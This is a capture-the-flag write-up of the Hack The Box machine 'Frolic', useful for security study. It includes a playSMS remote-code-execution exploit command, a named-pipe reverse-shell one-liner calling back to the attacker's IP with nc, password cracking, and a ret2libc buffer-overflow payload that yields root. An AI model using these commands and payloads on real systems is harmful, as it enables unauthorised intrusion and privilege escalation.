# HTB: Frolic

**Difficulty:** Easy
**OS:** Linux
**Target IP:** 10.129.71.20
**Attacker IP:** 10.10.15.146

---

## 1. Reconnaissance

### Port Scanning

I started with a fast port sweep, then followed up with a detailed service scan.

```bash
rustscan -a 10.129.71.20
```

```
Open 10.129.71.20:22
Open 10.129.71.20:139
Open 10.129.71.20:1880
Open 10.129.71.20:9999
```

```bash
nmap -sCV -T4 -p $(cat ports | awk -F ":" '{print $2}' | tr '\n' "," | sed 's/,$//') 10.129.71.20 -oA nmap/nmap
```

```
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
139/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
1880/tcp open  http        Node.js Express framework
9999/tcp open  http        nginx 1.10.3 (Ubuntu)
|_http-server-header: nginx/1.10.3 (Ubuntu)
|_http-title: Welcome to nginx!
Service Info: Host: FROLIC; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: frolic
| smb-security-mode:
|   account_used: guest
|_  message_signing: disabled (dangerous, but default)
```

Two separate web servers on non-standard ports (1880 and 9999), plus Samba on 139 — three independent attack surfaces to work through.

---

## 2. Initial Web Enumeration

### 2.1 Port 9999 — Default nginx Page

```
Welcome to nginx!
If you see this page, the nginx web server is successfully installed and working. Further configuration is required.

Thank you for using nginx. http://forlic.htb:1880
```

The default nginx page itself pointed me at a hostname — **`forlic.htb`** — and directly referenced port 1880, telling me these two ports belong to the same logical application even though they're separate services.

### 2.2 SMB — Quick Dead End

```bash
smbclient -L //10.129.71.20/ -N
```

```
Sharename       Type      Comment
---------       ----      -------
print$          Disk      Printer Drivers
IPC$            IPC       IPC Service (frolic server (Samba, Ubuntu))
```

Nothing but the default shares under a null session — I added `forlic.htb` to `/etc/hosts` and moved on to the web ports.

### 2.3 Enumerating Port 1880

```bash
ffuf -u http://forlic.htb:1880/FUZZ \
  -w /usr/share/wordlists/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt \
  -e .php,.html,.cgi,.php5 -mc 200,301,302,303,403 -fs 94105 -fw 1016
```

```
red                     [Status: 301]
vendor                  [Status: 301]
```

Both `/red` and `/vendor` blocked plain `GET` requests (`Cannot GET /vendor/`), so I fuzzed inside `/red` rather than assuming it was empty:

```bash
ffuf -u http://forlic.htb:1880/red/FUZZ \
  -w /usr/share/wordlists/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt \
  -e .php,.html,.cgi,.php5 -mc 200,301,302,303,403 -fs 94105 -fw 1016
```

```
images                  [Status: 301]
about                   [Status: 200]
```

```bash
cat about
```

```
#### 0.19.4: Maintenance Release
 - Fix race condition in non-cache lfs context Fixes #1888
 ...
```

This is a **Node-RED** changelog, confirming both the underlying application (Node-RED — a flow-based visual programming tool for wiring together IoT/API services, which also explains the "Node.js Express framework" banner from my initial scan) and its exact version, **0.19.4**. I made a note to check for known Node-RED vulnerabilities at that version, but kept enumerating rather than jumping straight to exploitation.

### 2.4 Enumerating Port 9999

```bash
feroxbuster -u http://forlic.htb:9999 \
  -w /usr/share/wordlists/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt \
  -x .php,.html
```

```
200      GET     http://forlic.htb:9999/
301      GET     http://forlic.htb:9999/admin => http://forlic.htb:9999/admin/
200      GET     http://forlic.htb:9999/admin/css/style.css
200      GET     http://forlic.htb:9999/admin/js/login.js
200      GET     http://forlic.htb:9999/admin/index.html
301      GET     http://forlic.htb:9999/test => http://forlic.htb:9999/test/
301      GET     http://forlic.htb:9999/dev => http://forlic.htb:9999/dev/
200      GET     http://forlic.htb:9999/test/index.php
200      GET     http://forlic.htb:9999/dev/test
200      GET     http://forlic.htb:9999/admin/success.html
301      GET     http://forlic.htb:9999/backup => http://forlic.htb:9999/backup/
200      GET     http://forlic.htb:9999/backup/index.php
301      GET     http://forlic.htb:9999/dev/backup => http://forlic.htb:9999/dev/backup/
200      GET     http://forlic.htb:9999/dev/backup/index.php
301      GET     http://forlic.htb:9999/loop => http://forlic.htb:9999/loop/
301      GET     http://forlic.htb:9999/backup/loop => http://forlic.htb:9999/backup/loop/
```

A whole separate custom admin panel, complete with its own login page and success page — a much richer target than the default nginx landing page suggested.

---

## 3. A Multi-Layer Puzzle to Reach a Real Credential

### 3.1 Hardcoded Credentials in Client-Side JavaScript

```bash
cat login.js
```

Pulled from `/admin/js/login.js`:

```javascript
var attempt = 3;
function validate(){
  var username = document.getElementById("username").value;
  var password = document.getElementById("password").value;
  if ( username == "admin" && password == "superduperlooperpassword_lol"){
    alert ("Login successfully");
    window.location = "success.html";
    return false;
  }
  ...
}
```

This login form does all of its "authentication" **client-side**, in plain readable JavaScript, comparing the entered credentials directly against a hardcoded string. That's a straightforward win — I didn't need to guess or crack anything, the actual credential (`admin` / `superduperlooperpassword_lol`) was sitting in the page source the whole time.

### 3.2 Logging In — an Esoteric-Language Puzzle

Logging in with those credentials landed me on `/admin/success.html`, which didn't show a normal success message — instead it showed a wall of `.`, `!`, and `?` characters in groups of four/five, repeating in patterns like `..... ..... .!?!! .?...`.

I recognized this pattern immediately as **Ook!** — an esoteric programming language that's functionally identical to Brainfuck, just using the three tokens `Ook.`, `Ook!`, and `Ook?` (here abbreviated to single punctuation characters) in place of Brainfuck's eight symbols. I pasted the text into an online Ook! interpreter (https://stuff.splitbrain.org/ook/) and converted it to plain text:

```
Nothing here check /asdiSIAJJ0QWE9JAS
```

### 3.3 Following the Hint

```bash
curl http://forlic.htb:9999/asdiSIAJJ0QWE9JAS/
```

This returned a long **Base64** blob. Decoding it:

```bash
echo "UEsDBBQACQAIAMOJN00j/lsUsAAAAGkCAAAJABwAaW5kZXgucGhwVVQJAAOFfKdbhXynW3V4CwAB..." | base64 -d > out
```

```bash
file out
```

```
out: Zip archive data, made by v3.0 UNIX, extract using at least v2.0, last modified Sep 23 2018 17:14:06, uncompressed size 617, method=deflate
```

The Base64 blob decoded to a real **zip archive** — the `PK` signature at the start of that Base64 string (`UEsD...` decodes to `PK\x03\x04`) is the standard tell for a zip file, which is why I checked `file` right away rather than assuming it was more text.

### 3.4 Cracking the Zip

```bash
unzip out
```

```
[out] index.php password:
```

Password protected. I cracked it directly against `rockyou.txt`:

```bash
fcrackzip -D -p /usr/share/wordlists/rockyou.txt -u out
```

```
PASSWORD FOUND!!!!: pw == password
```

The zip's password was, fittingly, literally **`password`**.

```bash
unzip out
```

```
inflating: index.php
```

### 3.5 A Second Layer of Obfuscation Inside index.php

The extracted `index.php` didn't contain a real credential in plain text either — it held a long **hex-encoded** string. I converted it back to raw bytes:

```bash
echo "4b7973724b7973674b7973724b797367..." | xxd -r -p
```

```
KysrKysgKysrKysgWy0+KysgKysrKysgKysrPF0gPisrKysgKy4tLS0gLS0uKysgKysrKysgLjwr
KysgWy0+KysgKzxdPisKKysuPCsgKytbLT4gLS0tPF0gPi0tLS0gLS0uLS0gLS0tLS0gLjwrKysg
K1stPisgKysrPF0gPisrKy4gPCsrK1sgLT4tLS0KPF0+LS0gLjwrKysgWy0+KysgKzxdPisgLi0t
LS4gPCsrK1sgLT4tLS0gPF0+LS0gLS0tLS4gPCsrKysgWy0+KysgKys8XT4KKysuLjwgCg==
```

The hex decoded into **another layer** — a Base64 string. Decoding that:

```bash
echo "KysrKysgKysrKysgWy0+KysgKysrKysgKysrPF0gPisrKysgKy4tLS0gLS0uKysgKysrKysgLjwr..." | base64 -d
```

```
+++++ +++++ [->++ +++++ +++<] >++++ +.--- --.++ +++++ .<+++ [->++ +<]>+
++.<+ ++[-> ---<] >---- --.-- ----- .<+++ +[->+ +++<] >+++. <+++[ ->---
<]>-- .<+++ [->++ +<]>+ .---. <+++[ ->--- <]>-- ----. <++++ [->++ ++<]>
++..<
```

That's raw **Brainfuck** — the same underlying interpreter as Ook! (Ook! is really just a 1:1 token substitution over Brainfuck's instruction set), so I fed it into the same online interpreter:

```
idkwhatispass
```

That whole chain — hex → Base64 → Brainfuck — decoded down to a real credential: **`idkwhatispass`**.

---

## 4. Exploitation — Foothold

### 4.1 Finding playsms

Browsing `http://forlic.htb:9999/dev/backup/`, I found a reference to `/playsms` — an actual application directory rather than more puzzle content. Visiting `http://forlic.htb:9999/playsms` gave me a real login page, and I tried the credential I'd just spent several layers decoding: `admin` / `idkwhatispass`. It worked.

### 4.2 Identifying a Known Vulnerability

I searched for public playSMS vulnerabilities and found **CVE-2017-9101** (https://github.com/jasperla/CVE-2017-9101) — an authenticated remote code execution vulnerability in playSMS's phonebook CSV import feature. The import functionality doesn't properly sanitize CSV field content before it ends up embedded in generated PHP, so a crafted phonebook entry can inject arbitrary PHP code that gets executed when the import is processed.

### 4.3 Confirming RCE

```bash
python3 exploit.py --username admin --password idkwhatispass --url http://forlic.htb:9999/playsms/index.php --command "id"
```

```
[*] Grabbing CSRF token for login
[*] Attempting to login as admin
[+] Logged in!
[*] Grabbing CSRF token for phonebook import
[*] Attempting to execute payload
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The exploit logs in, grabs the CSRF token needed for the phonebook import form, and submits a crafted CSV entry containing my `id` command — confirming code execution as `www-data`.

### 4.4 Getting a Reverse Shell

```bash
python3 exploit.py --username admin --password idkwhatispass --url http://forlic.htb:9999/playsms/index.php \
  --command "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.15.146 9001 >/tmp/f"
```

```bash
nc -lvnp 9001
```

```
connect to [10.10.15.146] from (UNKNOWN) [10.129.71.20] 52416
sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

✅ Foothold obtained as `www-data`.

---

## 5. A Dead End — Cracking a Hash That Led Nowhere

### 5.1 Finding Node-RED's Own Credentials

Poking around, I found the Node-RED installation directory from earlier's port 1880 recon:

```bash
cat /home/sahay/.node-red/settings.js
```

Inside the `adminAuth` block:

```javascript
adminAuth: {
    type: "credentials",
    users: [{
        username: "admin",
        password: "$2a$08$M6GkqpR1GdCDkQYXsR4zGOCl4gA/vWgNBSNKzCRr2RFKyYJNf08q.",
        permissions: "*"
    }]
},
```

A **bcrypt hash** for Node-RED's own admin login. I extracted it and ran it against `rockyou.txt`:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

```
password         (?)
1g 0:00:00:00 DONE
```

Cracked instantly to `password` — but this turned out to be a **dead end**. Logging into the Node-RED editor at port 1880 with `admin:password` just caused the page to load indefinitely rather than granting anything useful, and the hash didn't correspond to any real Linux system account either. I noted it and moved on rather than sinking more time into it — not every lead pans out, and this one just happened to be a red herring alongside the real privilege-escalation path.

---

## 6. Privilege Escalation

### 6.1 Finding a Custom SUID Binary

Continuing to enumerate the filesystem, I found something far more promising than the Node-RED hash:

```bash
strings /home/ayush/.binary/rop
```

```
setuid
strcpy
puts
printf
vuln
main
[*] Usage: program <message>
[+] Message sent:
```

Two details here immediately caught my attention: the binary calls **`setuid`** (meaning it's designed to change its running privilege level, and combined with a SUID bit on disk, that means "run as the file's owner" — worth checking who owns it), and it uses **`strcpy`** — a function with no bounds checking at all, notorious for enabling classic stack buffer overflows when user input is copied into a fixed-size buffer without any length validation.

### 6.2 Confirming the Architecture

```bash
ldd /home/ayush/.binary/rop
```

```
linux-gate.so.1 =>  (0xb7fda000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7e19000)
/lib/ld-linux.so.2 (0xb7fdb000)
```

This is a **32-bit** binary, dynamically linked against `libc.so.6`. That matters a lot for how I'd build an exploit: on 32-bit x86, function arguments are passed on the stack (not in registers like on x86_64), which makes a classic **ret2libc** (return-to-libc) attack straightforward to construct once I have a stack buffer overflow — I don't need to inject shellcode at all, I just need to redirect execution into functions that already exist inside libc.

### 6.3 Building a ret2libc Chain

Since `strcpy` overflowing a fixed buffer would let me overwrite the return address on the stack, my plan was to redirect execution straight into libc's own `system()` function with `"/bin/sh"` as its argument — spawning a shell with whatever privilege the SUID binary runs as, entirely using code that's already loaded in memory.

I needed three addresses from the exact libc this binary loads:

**The address of `system()`:**

```bash
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
```

```
1457: 0003ada0    55 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0
```

**An address to return to after `system()` runs** (doesn't need to do anything meaningful — I just needed *something* valid here so the overflow itself wouldn't crash before `system()` got a chance to execute):

```bash
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep exit
```

```
141: 0002e9d0    31 FUNC    GLOBAL DEFAULT   13 exit@@GLIBC_2.0
```

**The address of a `"/bin/sh"` string already sitting inside libc**, which I could use as `system()`'s argument without needing to inject my own string:

```bash
strings -atx /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
```

```
15ba0b /bin/sh
```

`readelf` gave me *offsets* relative to libc's base — since libc is loaded at `0xb7e19000` on this run (from the `ldd` output above), I added that base to each offset to get real runtime addresses: `system()` at `0xb7e19000 + 0x0003ada0`, `exit()` at `0xb7e19000 + 0x0002e9d0`, and the `"/bin/sh"` string at `0xb7e19000 + 0x0015ba0b`.

### 6.4 Triggering the Overflow

```bash
./rop $(python -c 'print("a"*52 + "\xa0\x3d\xe5\xb7" + "\xd0\x79\xe4\xb7" + "\x0b\x4a\xf7\xb7")')
```

Here's exactly why this payload has the shape it does:
- **`"a"*52`** — padding to fill the vulnerable buffer and everything between it and the saved return address on the stack. I determined 52 bytes was the right offset through testing, since that's exactly how far I need to write before the next four bytes land on the return address itself.
- **`\xa0\x3d\xe5\xb7`** — the address of `system()`, written in **little-endian** byte order (x86 is little-endian, so the least significant byte comes first) — this overwrites the saved return address, so when the vulnerable function returns, execution jumps straight into `system()` instead of back to `main()`.
- **`\xd0\x79\xe4\xb7`** — the address of `exit()`, placed where `system()` itself expects to find *its own* return address on the stack. `system()` doesn't know it was jumped to directly rather than called normally, so it will "return" to whatever address sits here — I supplied `exit()` so the process terminates cleanly afterward instead of crashing into an unmapped address.
- **`\x0b\x4a\xf7\xb7`** — the address of the `"/bin/sh"` string inside libc, placed exactly where `system()` expects to find its first argument on the stack (standard 32-bit cdecl calling convention: arguments follow the return address). This is what makes `system()` actually run `/bin/sh` instead of being called with garbage.

### 6.5 Root Shell

```
# id
uid=0(root) gid=33(www-data) groups=33(www-data)
```

✅ Root access obtained — `uid=0` confirms full root privilege, gained entirely through a stack buffer overflow chained into libc's own `system("/bin/sh")`, with no custom shellcode needed at all.

---

## 7. Summary

| Stage | Technique |
|-------|-----------|
| Recon | `rustscan` + `nmap` → SSH, Samba, and two separate web apps (1880, 9999) |
| Web Enum | Fingerprinted Node-RED 0.19.4 on 1880; found a full custom admin panel on 9999 |
| Credential Chain | Hardcoded creds in client-side JS → Ook!-encoded hint → Base64-encoded zip (cracked with `fcrackzip`/rockyou) → hex → Base64 → Brainfuck, finally decoding to a real credential (`idkwhatispass`) |
| Foothold | Logged into playSMS with the recovered credential; exploited **CVE-2017-9101** (authenticated phonebook-import RCE) → reverse shell as `www-data` |
| Dead End | Cracked Node-RED's own bcrypt admin hash, but it matched no real system account and led nowhere |
| Privilege Escalation | Found a custom SUID binary (`rop`) vulnerable to a classic `strcpy` stack buffer overflow; built a **ret2libc** chain (`system("/bin/sh")` via addresses pulled directly from the target's own libc) → root |

**Root cause / lessons learned:**
- Client-side authentication (the `/admin` login) is not authentication at all — any check performed entirely in JavaScript that the browser executes is trivially readable and bypassable; real authentication decisions must happen server-side.
- Obfuscation (Ook!, hex, Base64, zip passwords) is not encryption — every layer here was reversible with public tools and no secret key beyond a crackable zip password, and none of it actually protected the underlying credential.
- Outdated third-party applications with known, public authenticated RCEs (playSMS/CVE-2017-9101) remain a real risk even *behind* authentication — once any valid credential is found (however convoluted the path to it), the app itself becomes the next attack surface.
- Any binary using unbounded functions like `strcpy` on user-controlled input is a stack overflow waiting to happen; this is exactly why bounded alternatives (`strncpy`, `snprintf`, etc.) exist and should always be used instead — especially in a binary carrying the SUID bit, where the consequences of a successful exploit are immediate privilege escalation to root.
- Modern mitigations (stack canaries, ASLR, NX) exist specifically to make this exact ret2libc technique much harder — the fact that it worked cleanly here points to this binary being compiled without them, which is worth flagging as a build/toolchain hardening gap on top of the code-level bug.

---

## 8. Tools Used

- `rustscan`, `nmap` — reconnaissance
- `ffuf`, `feroxbuster` — content discovery across both web applications
- Online Ook!/Brainfuck interpreter (https://stuff.splitbrain.org/ook/) — decoding the multi-layer puzzle
- `base64`, `xxd` — encoding/decoding each layer of the credential chain
- `fcrackzip` (rockyou.txt) — zip password cracking
- CVE-2017-9101 exploit (https://github.com/jasperla/CVE-2017-9101) — authenticated playSMS RCE
- Named-pipe reverse shell (`mkfifo` + `nc`) — foothold shell handling
- `strings`, `ldd`, `readelf` — SUID binary analysis and libc address recovery
- Custom ret2libc payload (Python) — stack buffer overflow → `system("/bin/sh")` → root
- `john` (rockyou.txt) — bcrypt hash cracking (Node-RED admin hash, ultimately a dead end)
